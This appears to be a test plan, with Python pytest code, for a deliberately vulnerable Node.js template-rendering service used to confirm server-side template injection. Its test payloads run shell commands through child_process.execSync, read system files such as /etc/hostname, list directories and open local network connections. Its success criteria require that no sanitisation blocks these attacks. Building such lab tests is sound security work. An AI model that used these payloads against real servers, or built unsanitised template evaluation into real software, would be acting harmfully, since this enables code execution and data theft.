# SSTI Vulnerability Test Plan

[Implementation Plan](ssti_plan.md)

## Test Cases

### 1. Basic Template Functionality

#### 1.1 Template Creation
```python
def test_template_creation():
    response = requests.post('/api/template', json={
        'name': 'Basic Template',
        'content': 'Hello ${name}!'
    })
    assert response.status_code == 200
    assert 'id' in response.json()
    
    # Verify template was stored
    get_response = requests.get(f'/api/template/{response.json()["id"]}')
    assert get_response.status_code == 200
    assert get_response.json()['content'] == 'Hello ${name}!'
```

#### 1.2 Template Rendering
```python
def test_template_rendering():
    test_name = str(uuid.uuid4())
    response = requests.post('/api/template/render', json={
        'template': 'Hello ${name}!',
        'data': {'name': test_name}
    })
    assert response.status_code == 200
    assert response.json()['result'] == f'Hello {test_name}!'
```

### 2. SSTI Vulnerability Tests

#### 2.1 Code Execution via Template
```python
def test_ssti_code_execution():
    # Use a unique marker to verify command execution
    marker = str(uuid.uuid4())
    
    payloads = [
        # Echo our marker to verify execution
        f'${{require("child_process").execSync("echo {marker}")}}',
        # Read a specific file with known content
        '${require("fs").readFileSync("/etc/hostname")}',
        # Get process info
        '${process.pid}'
    ]
    
    for payload in payloads:
        response = requests.post('/api/template/render', json={
            'template': payload,
            'data': {}
        })
        
        assert response.status_code == 200
        result = response.json().get('result', '')
        
        # Verify actual command execution results
        if marker in payload:
            assert marker in result, "Command execution failed - marker not found in output"
        elif 'hostname' in payload:
            assert len(result) > 0, "File read failed - no content returned"
            assert not result.startswith('${'), "Template was not evaluated"
        elif 'process.pid' in payload:
            assert result.isdigit(), "Process info not returned correctly"
```

#### 2.2 File System Access
```python
def test_ssti_file_access():
    # First create a test file with known content
    test_content = str(uuid.uuid4())
    test_file = "test_ssti.txt"
    
    def setup():
        with open(test_file, 'w') as f:
            f.write(test_content)
    
    def cleanup():
        try:
            os.remove(test_file)
        except:
            pass
            
    try:
        setup()
        
        payloads = [
            # List directory and verify our test file exists
            f'${{JSON.stringify(require("fs").readdirSync("."))}}',
            # Read our test file and verify content
            f'${{require("fs").readFileSync("{test_file}", "utf8")}}',
            # Try to read a known system file
            '${require("fs").readFileSync("/etc/hostname", "utf8")}'
        ]
        
        for payload in payloads:
            response = requests.post('/api/template/render', json={
                'template': payload,
                'data': {}
            })
            
            assert response.status_code == 200
            result = response.json().get('result', '')
            
            if 'readdirSync' in payload:
                files = json.loads(result)
                assert test_file in files, "Directory listing failed - test file not found"
            elif test_file in payload:
                assert test_content in result, "File read failed - test content not found"
            elif 'hostname' in payload:
                assert len(result) > 0, "System file read failed"
                assert not result.startswith('${'), "Template was not evaluated"
    finally:
        cleanup()
```

#### 2.3 Network Access
```python
def test_ssti_network_access():
    # Start a test server
    test_marker = str(uuid.uuid4())
    server = TestServer(test_marker=test_marker)
    server.start()
    
    try:
        payloads = [
            # Make HTTP request to our test server
            f'${{require("http").get("http://localhost:{TEST_PORT}/test-ssti").on("response", (res) => {{res.setEncoding("utf8"); res.on("data", (chunk) => {{global.testResult = chunk}})}})}};${{global.testResult}}',
            # Try DNS lookup
            '${require("dns").lookup("localhost", (err, address) => { global.dnsResult = address })};${global.dnsResult}',
            # Try TCP connection
            f'${{require("net").connect({TEST_PORT}, "localhost", () => {{global.tcpResult = "connected"}})}}${{global.tcpResult}}'
        ]
        
        for payload in payloads:
            response = requests.post('/api/template/render', json={
                'template': payload,
                'data': {}
            })
            
            assert response.status_code == 200
            result = response.json().get('result', '')
            
            if 'test-ssti' in payload:
                assert test_marker in result, "HTTP request failed - marker not found"
            elif 'dns' in payload:
                assert result in ['127.0.0.1', '::1'], "DNS lookup failed"
            elif 'tcp' in payload:
                assert 'connected' in result, "TCP connection failed"
    finally:
        server.stop()
```

### 3. Edge Cases

#### 3.1 Template Syntax Variations
```python
def test_template_syntax():
    test_value = str(uuid.uuid4())
    
    variations = [
        # Test different syntax variations with a verifiable value
        (f'${{"{test_value}"}}', "Standard"),
        (f'${{{{{test_value}}}}}', "Double braces"),
        (f'#{{{test_value}}}', "Alternative syntax"),
        (f'@{{{test_value}}}', "At symbol"),
        # Test nested evaluation
        (f'${{`${{"{test_value}"}}`}}', "Nested template"),
        # Test with different data types
        (f'${{JSON.stringify({{value: "{test_value}"}})}}', "Object stringification"),
        (f'${{Buffer.from("{test_value}").toString("base64")}}', "Buffer manipulation")
    ]
    
    for payload, description in variations:
        response = requests.post('/api/template/render', json={
            'template': payload,
            'data': {}
        })
        
        assert response.status_code == 200, f"Failed for {description}"
        result = response.json().get('result', '')
        
        # Verify the test value appears in the output
        if 'JSON.stringify' in payload:
            assert test_value in result, f"Template evaluation failed for {description}"
        elif 'Buffer' in payload:
            # Decode base64 and verify
            decoded = base64.b64decode(result).decode()
            assert test_value in decoded, f"Buffer manipulation failed for {description}"
        else:
            assert test_value in result, f"Template evaluation failed for {description}"
```

### 4. Test Environment Setup

1. Required services:
```bash
docker-compose up -d
```

2. Test dependencies:
```bash
pip install -r test/requirements.txt
```

3. Environment variables:
```bash
export TEST_API_URL=http://localhost:3001
export TEST_INTERNAL_SERVICE=http://internal-service:8080
export TEST_PORT=8888
```

### 5. Test Execution

1. Run all tests:
```bash
python -m pytest test_ssti.py -v
```

2. Run specific test category:
```bash
python -m pytest test_ssti.py -k "code_execution" -v
```

### 6. Success Criteria

1. Template functionality:
   - Can create and retrieve templates
   - Basic template interpolation works
   - Template storage is persistent

2. SSTI vulnerability verification:
   - Code execution verified by checking command output
   - File system access verified by reading/writing test files
   - Network access verified by receiving requests on test server
   - No template sanitization blocks attacks

3. Edge cases handled:
   - Different syntax variations work
   - Nested templates processed
   - Complex payloads executed

### 7. Test Artifacts

1. Location: `test/artifacts/ssti/`
   - Generated templates
   - Execution outputs
   - Network captures
   - Error logs

2. Cleanup:
```bash
rm -rf test/artifacts/ssti/*
docker-compose down
```

## Links
- [Implementation Plan](ssti_plan.md)
- [Main Project Plan](../plan.md) 